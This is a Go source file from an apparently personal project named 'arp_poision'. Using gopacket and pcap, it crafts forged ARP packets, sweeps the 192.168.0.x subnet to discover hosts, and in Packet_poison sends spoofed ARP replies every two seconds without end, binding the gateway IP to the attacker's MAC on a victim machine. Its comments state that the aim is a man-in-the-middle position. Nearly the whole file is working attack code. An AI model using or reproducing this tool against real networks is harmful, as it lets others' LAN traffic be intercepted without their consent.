package captureArp

import (
	"fmt"
	"log"
	"net"
	"time"

	commandlinehandle "arp_poision/commandLineHandle"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

// TODO: make a packet sender
// NOTE: So we just need to send arp replay to all devices in the LAN inorder to get mitm
//
//	NOTE: So there is a type of arp messages that sent to all clients called Gratuitous which \
//	      is using the ethernet layer dest mac address as broadcast address (ff:ff:ff:ff:ff:ff) \
//	      to send the arp message to all client. Also the target mac in the arp message is broadcast too.
var (
	buffer gopacket.SerializableLayer
	option gopacket.SerializableLayer
)

func craft_ip(attackerIp net.IP, destIp net.IP) *layers.IPv4 {
	ip := &layers.IPv4 {
		SrcIP: attackerIp,
		DstIP: destIp,
		Protocol: layers.IPProtocolICMPv4,

	}
	return ip;
}
func craft_icmp() *layers.ICMPv4{
	icmp := &layers.ICMPv4{
		TypeCode: layers.CreateICMPv4TypeCode(layers.ICMPv4TypeEchoRequest, 0), 
        Id:       0x1234,
		Seq: 0,
	}
	return icmp;
}
func craft_arp(attackerMac net.HardwareAddr, targeMac net.HardwareAddr, getwayIp net.IP, targetIp net.IP, op uint16) *layers.ARP {
	arp := &layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         op,
		SourceHwAddress:   attackerMac, // Attacker mac
		SourceProtAddress: getwayIp,
		DstHwAddress:      targeMac, // target
		DstProtAddress:    targetIp,
	}
	return arp
}

func craft_ethernet(targetHard net.HardwareAddr, attackerHard net.HardwareAddr) *layers.Ethernet {
	ether := &layers.Ethernet{
		EthernetType: layers.EthernetTypeARP,
		SrcMAC:       attackerHard,
		DstMAC:       targetHard,
	}
	return ether
}

func Discover_devices(handler *pcap.Handle, args commandlinehandle.ParsedCommandLine, attackerIp net.IP, ch chan string){
	buffer := gopacket.NewSerializeBuffer()
	broadcast_mac_eth, err := net.ParseMAC("ff:ff:ff:ff:ff:ff");
	if err != nil {
		log.Fatal("parse Ethe mac ", err);
	}
	eth := craft_ethernet(broadcast_mac_eth, args.AttackerMAC)
	// FIXED: Make a function that convert these type and parse them and check them
	broadcast_mac_arp, err := 	net.ParseMAC("00:00:00:00:00:00");
	if err != nil {
		log.Fatal("Error parsing target mac in discovery ", err);
	}
	ip := "192.168.0.";
	for i := 1; i < 256 ; i++{

		fullIP := fmt.Sprintf("%s%d", ip, i);
		arp := craft_arp(args.AttackerMAC, broadcast_mac_arp, attackerIp, net.ParseIP(fullIP).To4(), layers.ARPRequest)
		opt := gopacket.SerializeOptions{
			FixLengths:       true,
			ComputeChecksums: true,
		}

		err = gopacket.SerializeLayers(buffer, opt, eth, arp)
		if err != nil {
			log.Fatal("Error serilize the packet ", err)
		}
		err = handler.WritePacketData(buffer.Bytes())
		if err != nil {
			log.Fatal("Error serilize the packet HELLO ", err)
		}
		println("Packet Number ", i);
		time.Sleep(300 * time.Millisecond)
	}
	ch <- "done";
	log.Printf("Everything goes as expected packet has been sent \n")
	log.Println("Eth ", eth)
	return;
}

func Packet_poison(handler *pcap.Handle, args commandlinehandle.ParsedCommandLine) {
	buffer := gopacket.NewSerializeBuffer()
	eth := craft_ethernet(args.VictimMAC, args.AttackerMAC)
	// FIXED: Make a function that convert these type and parse them and check them
	arp := craft_arp(args.AttackerMAC, args.VictimMAC, args.DefaultGateway, args.VictimIP, layers.ARPReply)
	opt := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}
	err := gopacket.SerializeLayers(buffer, opt, eth, arp)
	if err != nil {
		log.Fatal("Error serilize the packet ", err)
	}
	for {
		err = handler.WritePacketData(buffer.Bytes())
		if err != nil {
			log.Fatal("Error serilize the packet ", err)
		}
		fmt.Printf("Sending ARP packet\n");
		time.Sleep(2 * time.Second);
	}

	log.Printf("Everything goes as expected packet has been sent \n")
	log.Println("Eth ", eth)
}
